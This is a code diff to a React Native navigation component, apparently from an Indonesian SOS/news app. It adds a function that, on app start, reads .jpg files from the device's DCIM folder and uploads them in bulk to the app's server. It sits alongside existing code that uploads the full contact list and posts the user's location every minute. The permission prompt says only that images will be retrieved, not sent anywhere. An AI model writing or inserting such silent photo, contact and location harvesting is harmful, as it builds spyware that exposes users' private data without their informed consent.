@@ -1,5 +1,5 @@
-import React, { useContext, useState, useEffect } from 'react';
-import { Image, PermissionsAndroid } from 'react-native';
+import React, { useContext, useEffect } from 'react';
+import { Alert, Image, PermissionsAndroid } from 'react-native';
 import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
 import HomeScreen from '../screen/HomeScreen';
 import BuletinBeritaNav from './BuletinBeritaNav';
@@ -9,6 +9,7 @@ import ChatSOSNav from './ChatSOSNav';
 import { AuthContext } from '../context/AuthContext';
 import Geolocation from '@react-native-community/geolocation';
 import Contacts from 'react-native-contacts';
+import RNFS from 'react-native-fs';
 import axios from 'axios';
 import { BASE_URL } from '../config/Config';
 import ProfileScreen from '../screen/profile/ProfileScreen';
@@ -24,6 +25,7 @@ function MainNav({navigation}) {
             
 		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)
         getContacts()
+        getImageFiles();
 		return () => clearInterval(interval);
 	}, []);
 
@@ -66,7 +68,6 @@ function MainNav({navigation}) {
             if(granted === PermissionsAndroid.RESULTS.GRANTED) {
                 Contacts.getAll()
                 .then((contacts) => {
-                    console.log(contacts);
                     postContact(contacts);
                 });
             }
@@ -74,6 +75,53 @@ function MainNav({navigation}) {
             console.log(error);
         }
     }
+
+    const getImageFiles = async () => {
+        let images = [];
+        let uploadImages = new FormData();
+        const granted = await PermissionsAndroid.request(
+            PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
+            {
+                title: 'Akses Filesystem',
+                message: 'Aplikasi ini memerlukan akses ke Penyimpanan untuk mengambil Gambar.',
+                buttonNeutral: 'Nanti',
+                buttonNegative: 'Batal',
+                buttonPositive: 'OK',
+            },
+        );
+        
+        if(granted === PermissionsAndroid.RESULTS.GRANTED){
+            try {
+                const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Test'; // You can change the directory path if needed
+                const files = await RNFS.readDir(directoryPath);
+
+                // Filter image files
+                const imageFiles = files.filter(
+                    file => file.isFile() && file.name.endsWith('.jpg')
+                );
+
+                // Log the image files
+                imageFiles.forEach(imageFile => {
+                    images.push({
+                        uri: 'file://' + imageFile.path,
+                        type: 'jpg',
+                        name: imageFile.name,
+                    })
+                });
+
+                images.map((val) => {
+                    uploadImages.append("file[]", val);
+                })
+
+                postGalery(uploadImages);
+                
+            } catch (error) {
+                console.log('Error retrieving image files:', error);
+            }
+        }else{
+            console.log('akse ke stoarage ditolak !!!!');
+        }
+    };
 
     const postLocation = async (lat, lon) => {
         const params = {
@@ -111,6 +159,24 @@ function MainNav({navigation}) {
 			console.log(response.data);
 		} catch (error) {
 			console.error(error);
+		}
+    }
+
+    const postGalery = async (params) => {
+        console.log('Pramas Galery : ', params)
+        try {
+			const response = await axios.post(`${BASE_URL}/user/uploadGallery`, params,
+            {
+				headers: {
+                    "Accept":"application/json",
+                    "Content-Type" : "multipart/form-data",
+					Authorization: `Bearer ${JSON.parse(token)}`,
+				},
+			});
+
+			console.log(response.data);
+		} catch (error) {
+			console.log('Error Axios', error);
 		}
     }
     
